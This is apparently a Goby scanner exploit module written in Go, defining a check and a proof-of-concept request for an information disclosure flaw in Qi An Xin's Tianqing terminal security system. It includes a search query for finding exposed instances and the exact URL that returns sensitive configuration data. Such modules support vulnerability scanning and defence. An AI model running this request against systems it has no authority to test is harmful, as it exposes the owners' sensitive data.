package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Qi An Xin Tianqing Terminal Security Management System information disclosure vulnerability",
    "Description": "<p>Tianqing Terminal Security Management System is an integrated terminal security product solution for government and enterprise units.</p><p>Tianqing Terminal Security Management System has an information disclosure vulnerability,the attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2023-01-04",
    "Author": "WJK",
    "FofaQuery": "title=\"新天擎\"",
    "GobyQuery": "title=\"新天擎\"",
    "Level": "1",
    "Impact": "<p>Tianqing Terminal Security Management System has an information disclosure vulnerability,the attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/runtime/admin_log_conf.cache",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "setting/policy/client",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "终端策略",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "漏洞管理",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/runtime/admin_log_conf.cache",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "setting/policy/client",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "终端策略",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "漏洞管理",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "奇安信天擎终端安全管理系统信息泄露漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。</p><p>天擎终端安全管理系统存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>天擎终端安全管理系统存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Qi An Xin Tianqing Terminal Security Management System information disclosure vulnerability",
            "Product": "Qianxin-TianQing",
            "Description": "<p>Tianqing Terminal Security Management System is an integrated terminal security product solution for government and enterprise units.</p><p>Tianqing Terminal Security Management System has an information disclosure vulnerability,the attacker reads the sensitive information of the system by constructing a special URL address.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Tianqing Terminal Security Management System has an information disclosure vulnerability,the attacker reads the sensitive information of the system by constructing a special URL address.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10805"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}